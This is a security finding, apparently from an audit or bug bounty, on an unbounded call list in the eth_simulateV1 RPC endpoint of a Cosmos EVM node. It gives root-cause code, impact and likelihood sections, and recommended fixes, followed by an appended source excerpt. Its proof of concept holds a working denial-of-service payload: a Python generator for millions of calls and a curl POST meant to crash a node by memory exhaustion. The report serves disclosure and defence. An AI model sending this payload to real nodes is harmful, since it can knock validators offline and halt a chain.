### Title
Unbounded `calls` Array in `eth_simulateV1` `SimBlock` Enables Unauthenticated Memory Exhaustion — (File: `x/evm/keeper/simulate.go`, `rpc/types/simulate.go`)

---

### Summary

The `eth_simulateV1` JSON-RPC endpoint accepts a `SimBlock.Calls []json.RawMessage` field with no per-block call count limit. `processBlock` allocates three full-length slices (`callResults`, `transactions`, `receipts`) proportional to `len(block.Calls)` before any gas or budget check is applied. An unprivileged attacker can send a single unauthenticated HTTP request containing one block with millions of zero-cost call entries, forcing the node to allocate gigabytes of memory and crash via OOM, halting the node's participation in consensus.

---

### Finding Description

**Root cause — no call count limit before upfront allocation:**

`SimBlock` is defined as:

```go
type SimBlock struct {
    BlockOverrides *SimBlockOverrides `json:"blockOverrides"`
    StateOverrides *SimStateOverride  `json:"stateOverrides"`
    Calls          []json.RawMessage  `json:"calls"`
}
``` [1](#0-0) 

There is no cap on `len(Calls)`. The only block-count guard is `MaxSimulateBlocks = 256`, which limits the number of `SimBlock` entries, not the number of calls inside each block. [2](#0-1) 

Inside `processBlock`, three slices are allocated upfront for **all** calls before any gas or budget check runs:

```go
callResults  := make([]rpctypes.SimCallResult, len(block.Calls))
transactions := make([]*ethtypes.Transaction,  len(block.Calls))
receipts     := make(ethtypes.Receipts,         len(block.Calls))
``` [3](#0-2) 

Gas and budget checks only happen inside the per-call loop, after these allocations:

```go
for i, callJSON := range block.Calls {
    ...
    if err := sim.sanitizeCall(&call, sim.state, header, &remainingBlockGas); err != nil {
        return nil, nil, nil, err
    }
    ...
    if err := sim.budget.Consume(gasUsed); err != nil {
        return nil, nil, nil, err
    }
``` [4](#0-3) 

**No HTTP body size limit:**

The JSON-RPC HTTP server is configured without a `MaxBytesReader` or equivalent body-size cap:

```go
httpSrv := &http.Server{
    Addr:              config.JSONRPC.Address,
    Handler:           rpcHandler,
    ReadHeaderTimeout: config.JSONRPC.HTTPTimeout,
    ReadTimeout:       config.JSONRPC.HTTPTimeout,
    ...
}
``` [5](#0-4) 

`SetBatchLimits` only constrains JSON-RPC *batch* arrays, not the size of individual method parameters:

```go
rpcServer.SetBatchLimits(config.JSONRPC.BatchRequestLimit, config.JSONRPC.BatchResponseMaxSize)
``` [6](#0-5) 

**`GasBudget` does not prevent the allocation:**

`GasBudget` is consumed per-call *after* execution, not before the slice allocation. Even if the budget is exhausted after the first call, the full `len(block.Calls)` slices are already resident in memory. [7](#0-6) 

**Secondary vector — unbounded `stateOverrides` map:**

`SimStateOverride` is also an unbounded `map[common.Address]SimOverrideAccount`, and each entry can carry an unbounded `State map[common.Hash]common.Hash`. `Apply` iterates the entire map without a size check. [8](#0-7) 

---

### Impact Explanation

An attacker sends a single unauthenticated POST to the public JSON-RPC port with one `SimBlock` containing N million minimal call entries (e.g., `{"from":"0x...","to":"0x...","gas":"0x5208"}`). The server:

1. Reads the body (no size limit, only a 30-second read timeout — feasible on a 1 Gbps link).
2. Unmarshals the JSON.
3. Allocates `callResults[N]`, `transactions[N]`, `receipts[N]` — each `SimCallResult` is ~100+ bytes, so N = 10M → ~1 GB of heap.
4. Crashes via OOM.

Because the JSON-RPC server runs in the same OS process as the CometBFT consensus engine, an OOM kill terminates the entire node. If the targeted node is a validator, it drops out of the active set, and coordinated targeting of multiple validators can halt the chain.

**Impact category:** High (public JSON-RPC path exposes a reachable route to node crash / chain halt) — potentially Critical if validators expose the endpoint.

---

### Likelihood Explanation

- The endpoint is public and requires no authentication or API key.
- A single HTTP request is sufficient; no on-chain funds or keys are needed.
- The default JSON-RPC address `127.0.0.1:8545` is localhost-only by default, but many deployments bind to `0.0.0.0` or expose the port via a reverse proxy.
- The `DefaultHTTPTimeout = 30s` allows a ~375 MB body at 100 Mbps, and a ~3.75 GB body at 1 Gbps — well above the threshold needed to trigger OOM. [9](#0-8) [10](#0-9) 

---

### Recommendation

1. **Add a per-block call count cap** in `processBlock` (or in `SimBlock` validation) before the upfront slice allocation:

   ```go
   const MaxCallsPerSimBlock = 1000 // or a configurable value
   if len(block.Calls) > MaxCallsPerSimBlock {
       return nil, nil, nil, &rpctypes.ClientLimitExceededError{
           Message: fmt.Sprintf("too many calls in block: %d > %d", len(block.Calls), MaxCallsPerSimBlock),
       }
   }
   ```

2. **Add an HTTP request body size limit** in `StartJSONRPC` using `http.MaxBytesReader` or a middleware, analogous to how `BatchResponseMaxSize` limits responses.

3. **Add a `stateOverrides` entry count cap** in `SimStateOverride.Apply` before iterating.

4. **Expose a configurable `json-rpc.max-simulate-calls-per-block` flag** alongside the existing batch-limit flags.

---

### Proof of Concept

```bash
# Generate a payload with 5,000,000 minimal calls in one block
python3 -c "
import json, sys
call = json.dumps({'from':'0xc000000000000000000000000000000000000000',
                   'to':  '0xc100000000000000000000000000000000000000',
                   'gas': '0x5208'})
calls = [call] * 5_000_000
block = {'calls': calls}
req = {'jsonrpc':'2.0','method':'eth_simulateV1',
       'params':[{'blockStateCalls':[block]},'latest'],'id':1}
sys.stdout.write(json.dumps(req))
" > payload.json

# Send to a node with the JSON-RPC port exposed
curl -X POST http://<node>:8545/ \
     -H 'Content-Type: application/json' \
     --data-binary @payload.json
# Expected: node process killed by OOM before response is returned
```

The server allocates `make([]rpctypes.SimCallResult, 5_000_000)` + `make([]*ethtypes.Transaction, 5_000_000)` + `make(ethtypes.Receipts, 5_000_000)` — approximately 600 MB–1 GB of heap — before the first gas check runs, triggering OOM on typical validator hardware. [3](#0-2) [11](#0-10) [1](#0-0)

// SimStateOverride is the collection of overridden accounts for simulation.
type SimStateOverride map[common.Address]SimOverrideAccount

func (diff *SimStateOverride) has(address common.Address) bool {
	_, ok := (*diff)[address]
	return ok
}

// Apply overrides the fields of specified accounts into the given state.
// Supports precompile moves via MovePrecompileTo.
func (diff *SimStateOverride) Apply(stateDB *statedb.StateDB, precompiles vm.PrecompiledContracts) error {
	if diff == nil {
		return nil
	}
	// Iterate in deterministic order.
	addrs := slices.SortedFunc(maps.Keys(*diff), common.Address.Cmp)

	// Tracks destinations of precompiles that were moved.
	dirtyAddrs := make(map[common.Address]struct{})
	for _, addr := range addrs {
		account := (*diff)[addr]
		// If a precompile was moved to this address already, it can't be overridden.
		if _, ok := dirtyAddrs[addr]; ok {
			return &InvalidParamsError{Message: fmt.Sprintf("account %s has already been overridden by a precompile", addr.Hex())}
		}
		p, isPrecompile := precompiles[addr]
		if account.MovePrecompileTo != nil {
			if !isPrecompile {
				return &ServerError{Message: fmt.Sprintf("account %s is not a precompile", addr.Hex())}
			}
			if diff.has(*account.MovePrecompileTo) {
				return &InvalidParamsError{Message: fmt.Sprintf("account %s is already overridden", account.MovePrecompileTo.Hex())}
			}
			precompiles[*account.MovePrecompileTo] = p
			dirtyAddrs[*account.MovePrecompileTo] = struct{}{}
		}
		if isPrecompile {
			delete(precompiles, addr)
		}
		// Override account nonce.
		if account.Nonce != nil {
			stateDB.SetNonce(addr, uint64(*account.Nonce), tracing.NonceChangeUnspecified)
		}
		// Override account(contract) code.
		if account.Code != nil {
			stateDB.SetCode(addr, *account.Code, tracing.CodeChangeUnspecified)
		}
		// Override account balance.
		if account.Balance != nil {
			u256Balance, overflow := uint256.FromBig((*big.Int)(account.Balance))
			if overflow {
				return &InvalidParamsError{Message: fmt.Sprintf("account %s balance overflows uint256", addr.Hex())}
			}
			stateDB.SetBalance(addr, *u256Balance)
		}
		if account.State != nil && account.StateDiff != nil {
			return &InvalidParamsError{Message: fmt.Sprintf("account %s has both 'state' and 'stateDiff'", addr.Hex())}
		}
		// Replace entire state if caller requires.
		if account.State != nil {
			stateDB.SetStorage(addr, account.State)
		}
		// Apply state diff into specified accounts.
		if account.StateDiff != nil {
			for key, value := range account.StateDiff {
				stateDB.SetState(addr, key, value)
			}
		}
	}
	// Finalize overrides so they behave as if applied in a preceding transaction.
	//nolint:misspell
	stateDB.Finalise(false)
	return nil
}

// GasBudget tracks the remaining gas allowed across all simulated blocks.
type GasBudget struct {
	remaining uint64
}

// NewGasBudget creates a gas budget with the given cap. A cap of 0 is unlimited.
func NewGasBudget(gasCap uint64) *GasBudget {
	if gasCap == 0 {
		gasCap = math.MaxUint64
	}
	return &GasBudget{remaining: gasCap}
}

// Cap returns the given gas value clamped to the remaining budget.
func (b *GasBudget) Cap(gas uint64) uint64 {
	if gas > b.remaining {
		return b.remaining
	}
	return gas
}

// Consume deducts the given amount from the budget.
func (b *GasBudget) Consume(amount uint64) error {
	if amount > b.remaining {
		return fmt.Errorf("RPC gas cap exhausted: need %d, remaining %d", amount, b.remaining)
	}
	b.remaining -= amount
	return nil
}
